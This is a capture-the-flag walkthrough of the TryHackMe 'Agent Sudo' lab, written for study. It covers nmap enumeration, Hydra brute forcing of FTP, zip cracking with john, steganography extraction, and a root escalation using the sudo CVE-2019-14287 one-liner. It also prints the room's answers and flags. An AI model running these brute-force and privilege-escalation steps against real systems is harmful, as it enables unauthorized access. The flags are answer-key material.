**Tristan Gomez**

## Description
```
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.
```


## Task 2: Enumerate
* `Enumerate the machine and get all the important information`

a) `How many open ports?`
 - We can see from the nmap scan that we have three ports open.

```
$ sudo nmap -sS 10.10.141.49
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 14:49 PDT
Nmap scan report for 10.10.141.49
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

When we first navigate to the website we get the following message...
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```
There doesn't appear to be anything hidden in the source code of the page. 
I attempted to login to the ftp service using `anonymous:password` but anonymous ftp is not allowed. 


b) `How you redirect yourself to a secret page?`
* user-agent

I wrote a short Python script to send a GET request to the landing page. I used the Requests library to change the user-agent to `C`. When I received the response, I got ...
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

c) `What is the agent name?`
* chris

### Hash cracking and brute-force
`Done enumerate the machine? Time to brute your way out.`

a) `FTP password`
* crystal

Using Hydra, I brute forced the ftp password for chris resulting in ...
```
hydra -l chris -P xato-net-10-million-passwords-10000.txt ftp://10.10.141.49
[21][ftp] host: 10.10.141.49   login: chris   password: crystal
```


FTP Credentials: `chris:crystal`


Inside the chris' ftp directory I found two images and `To_agentJ.txt`...

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

b) `Zip file password`
* alien

It looks like this has suddenly become a stego challenge. Well, lets see what we have. I downloaded all of the files in Chris' directory to my machine. 


In the `cutie.png` I found a hidden .zip and .txt files.
```
$ binwalk --extract *.png                                                                                        

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

I used zip2john to convert the .zip file into a format that john the ripper would be able to crack the password for. 

```
zip2john 8702.zip > output.txt                                                                                 
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

```

Then I ran `sudo john output.txt` to crack the password of the zip file.
```
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
```

It looks like we have our password: `alien`. Let's give it a try!
```
└─$ 7z e 8702.zip                                                                                                  

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz (A0655),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 05:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 05:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280

```

B-b-b-bingo! Let's open the To_agentR.txt and see what we have. 

c) `steg password`
* alien

```
─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

Interesting, we have an encoded string. I am going to go to cyberchef and see what if I can crack it. It looks like this string is Base64 encoded and cyberchef confirmed that hypothesis.

`QXJlYTUx` == `Area51`

Using the password `Area51`, I used steghide to extract the .jpg file to get `message.txt`

d) `Who is the other agent (in full name)?`
* james

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```


e) `SSH password`
* hackerrules!


### Task 4: Capture the user flag

SSH in as `james:hackerrules!`



When I first logged in, I decided to check the sudo permissions/information for james...
```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

I decided to also check the version of sudo being ran. This will become important in a bit. 
```
james@agent-sudo:~$ sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

a) `What is the user flag?`
* b03d975e8c92a7c04146cfa7a5a313c7

As james, we can access the user_flag.
```
cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```


b) `What is the incident of the photo called?`

I did a reverse image search for the alien photo found and its name is `Roswell alien autopsy`.



### Privilege escalation
* Enough with the extraordinary stuff? Time to get real.

a) `CVE number for the escalation`
* cve-2019-14287

This is where the version of sudo becomes important. Doing some research, I found a reported vulnerability in this version of sudo that allows a nonprivileged user escalate themselves to the root user. This vulnerability also exploits the current user's permissions. Recall that we saw that user james can run /bin/bash but not as a root user. Well, this vulnerability lets us run /bin/bash as the root user by setting the user id to `-1` or `0xffffffff`.
```
james@agent-sudo:/$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:/# 

```

And boom! I'm in! As a side note, the below command is the same exact exploit just represented slightly differently. 
`sudo -u \#-1 /bin/bash`

b) `What is the root flag?`
* b53a02f55b57d4439e3341834d70c062

Let's finish up this challenge...
```
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

```
c) `(Bonus) Who is Agent R?`
* DesKel
